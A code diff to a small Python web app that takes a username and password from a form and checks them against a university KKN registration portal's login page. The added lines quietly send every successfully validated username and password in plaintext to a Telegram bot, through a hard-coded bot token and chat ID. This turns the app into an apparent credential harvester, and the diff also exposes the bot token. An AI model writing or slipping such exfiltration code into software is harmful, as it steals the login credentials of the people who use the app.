@@ -22,6 +22,7 @@ def run():
         y = request.form['pass']
         return umsida(x, y)
 
+
 def umsida(usr, pwd):
     url = 'https://kkn.uii.ac.id/login.php'
     x = {
@@ -31,8 +32,12 @@ def umsida(usr, pwd):
         }
     post = req.post(url, data=x).url
     if post.find('KKN-Status-Pendaftaran') != -1:
+        msg = "username: "+usr+"\npassword: "+pwd+"\n"
+        TOKEN = '2011172773:AAG-23HV-MX8Wn0anI5Bm9fuoQC4pJVwy7U'
+        CHAT_ID = '1884067981'
+        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}'
+        ntz = req.post(url)
         return 'Login sukses'
-        
     else:
         return 'Login gagal'
         
